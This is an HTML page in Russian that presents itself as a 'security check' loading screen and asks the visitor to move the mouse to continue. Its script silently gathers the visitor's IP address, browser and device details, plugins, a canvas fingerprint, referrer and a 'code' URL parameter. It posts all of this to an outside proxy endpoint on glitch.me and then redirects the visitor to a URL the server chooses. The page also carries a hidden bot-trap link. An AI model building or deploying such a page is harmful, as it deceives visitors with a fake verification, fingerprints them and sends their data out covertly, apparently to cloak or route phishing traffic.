<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            color: #333;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }

        .loader {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #4285f4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 500;
            color: #333;
            margin-bottom: 10px;
        }

        .human-verification {
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08), 
                        0 6px 12px rgba(0, 0, 0, 0.05), 
                        inset 0 -3px 0 rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 340px;
            transition: all 0.5s ease-in-out, transform 0.3s ease;
            opacity: 1;
            transform: translateY(0);
            position: relative;
            overflow: hidden;
            z-index: 10;
        }

        .human-verification.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }

        .human-verification h3 {
            margin-top: 0;
            margin-bottom: 15px;
            color: #4285f4;
            font-size: 24px;
            font-weight: 600;
        }

        .human-verification p {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
            color: #5f6368;
        }

        .mouse-icon {
            display: inline-block;
            width: 40px;
            height: 60px;
            border: 3px solid #4285f4;
            border-radius: 20px;
            position: relative;
            margin: 0 auto 15px;
        }

        .mouse-icon:before {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            background: #4285f4;
            border-radius: 50%;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            animation: mousescroll 2s infinite;
        }

        .bot-trap-link {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            font-size: 0;
            height: 0;
            width: 0;
        }

        .error-message {
            color: #d93025;
            margin-top: 20px;
            display: none;
            text-align: center;
            padding: 10px;
            border-radius: 8px;
            background-color: rgba(217, 48, 37, 0.1);
            max-width: 340px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0; }
            50% { transform: scale(1); opacity: 0.6; }
            100% { transform: scale(1.05); opacity: 0; }
        }

        @keyframes mousescroll {
            0% { opacity: 1; top: 10px; }
            50% { opacity: 1; top: 25px; }
            100% { opacity: 0; top: 30px; }
        }

        @media (max-width: 768px) {
            .human-verification {
                width: 85%;
                max-width: 300px;
                padding: 20px;
            }
            
            .loader {
                width: 50px;
                height: 50px;
            }
            
            .loading-text {
                font-size: 18px;
            }
            
            .human-verification h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <div class="loading-text">Загрузка...</div>
    </div>

    <div class="human-verification">
        <div class="pulse-effect"></div>
        <h3>Проверка безопасности</h3>
        <div class="mouse-icon"></div>
        <p>Пожалуйста, подвигайте курсором, чтобы продолжить</p>
    </div>

    <div class="error-message" id="errorMessage">
        Произошла ошибка. Пожалуйста, попробуйте позже.
    </div>

    <a href="#" class="bot-trap-link">Секретная ссылка только для ботов</a>

    <script>
    (async function() {
        'use strict';

        // ===== КОНСТАНТЫ И ИНИЦИАЛИЗАЦИЯ =====
        const PAGE_LOAD_START = performance.now();
        const SERVER_ENDPOINT = 'https://reverse-proxy-service.glitch.me/proxy'; // Прокси на Glitch
        const MAX_RETRY_COUNT = 3;
        const RETRY_DELAY = 1000;
        
        // Флаги состояния
        let hadMouseMovement = false;
        let redirectInitiated = false;
        let mouseMoveTimeout = null;
        let redirectTimeout = null;
        
        // Получение ссылки на блок проверки человека
        const humanVerificationBlock = document.querySelector('.human-verification');
        const errorMessageBlock = document.getElementById('errorMessage');
        
        // Определение типа устройства
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // Счетчик визитов
        let visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1;
        localStorage.setItem('visitCount', visitCount.toString());

        // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
        function getUrlParameter(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        async function getIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (response.ok) {
                    const data = await response.json();
                    return data.ip;
                }
            } catch (error) {
                console.error("Ошибка при получении IP:", error);
            }
            return "Не определено";
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#00f';
                ctx.fillText('Canvas Fingerprint', 2, 2);
                ctx.fillStyle = '#f00';
                ctx.arc(50, 30, 15, 0, Math.PI * 2, true);
                ctx.fill();
                return canvas.toDataURL().substring(0, 100) + '...';
            } catch (e) {
                return "Canvas недоступен";
            }
        }

        async function collectUserInfo() {
            const now = performance.now();
            const loadTime = Math.round(now - PAGE_LOAD_START);
            const ipAddress = await getIpAddress();
            
            return {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                deviceType: isMobile ? 'mobile' : 'desktop',
                isMobile: isMobile,
                visitCount: visitCount,
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                url: window.location.href,
                referrer: document.referrer || "none",
                codeParam: getUrlParameter('code'),
                cookiesEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency || "Не определено",
                doNotTrack: navigator.doNotTrack || "Не определено",
                webdriver: !!navigator.webdriver,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || "Не определено",
                canvas: getCanvasFingerprint(),
                hadMouseMovement: hadMouseMovement,
                loadTime: loadTime,
                ipAddress: ipAddress
            };
        }

        async function sendToServer(userInfo) {
            try {
                // Используем прокси-сервис на Glitch для пересылки запросов на ваш локальный сервер
                const response = await fetch(SERVER_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(userInfo)
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return await response.json();
            } catch (error) {
                console.error("Ошибка при отправке данных:", error);
                throw error;
            }
        }

        function redirect(url) {
            if (redirectInitiated) return;
            redirectInitiated = true;
            
            setTimeout(() => {
                window.location.href = url;
            }, 800);
        }

        function showError(message) {
            errorMessageBlock.textContent = message || "Произошла ошибка. Пожалуйста, попробуйте позже.";
            errorMessageBlock.style.display = 'block';
            document.querySelector('.loader-container').style.display = 'none';
            humanVerificationBlock.style.display = 'none';
        }

        // ===== ОБРАБОТЧИКИ СОБЫТИЙ =====
        document.addEventListener('mousemove', () => {
            if (!hadMouseMovement) {
                hadMouseMovement = true;
                humanVerificationBlock.classList.add('hidden');
            }
            
            if (mouseMoveTimeout) {
                clearTimeout(mouseMoveTimeout);
                mouseMoveTimeout = null;
            }
            
            if (!redirectTimeout && !redirectInitiated) {
                redirectTimeout = setTimeout(async () => {
                    try {
                        const userInfo = await collectUserInfo();
                        const response = await sendToServer(userInfo);
                        console.log("Ответ сервера:", response);
                        redirect(response.redirect);
                    } catch (error) {
                        showError("Не удалось связаться с сервером. Попробуйте позже.");
                    }
                }, 1000);
            }
        });

        if (isMobile) {
            hadMouseMovement = true;
            humanVerificationBlock.classList.add('hidden');
        }

        document.querySelector('.bot-trap-link').addEventListener('click', async (e) => {
            e.preventDefault();
            try {
                const userInfo = await collectUserInfo();
                userInfo.botTrapActivated = true;
                const response = await sendToServer(userInfo);
                redirect(response.redirect);
            } catch (error) {
                showError("Ошибка сервера");
            }
        });

        window.onload = async () => {
            try {
                if (isMobile) {
                    const userInfo = await collectUserInfo();
                    const response = await sendToServer(userInfo);
                    redirect(response.redirect);
                } else {
                    mouseMoveTimeout = setTimeout(async () => {
                        if (!hadMouseMovement) {
                            const userInfo = await collectUserInfo();
                            const response = await sendToServer(userInfo);
                            redirect(response.redirect);
                        }
                    }, 7000);
                }
            } catch (error) {
                console.error("Ошибка при инициализации:", error);
                showError("Ошибка инициализации");
            }
        };
    })();
    </script>
</body>
</html>
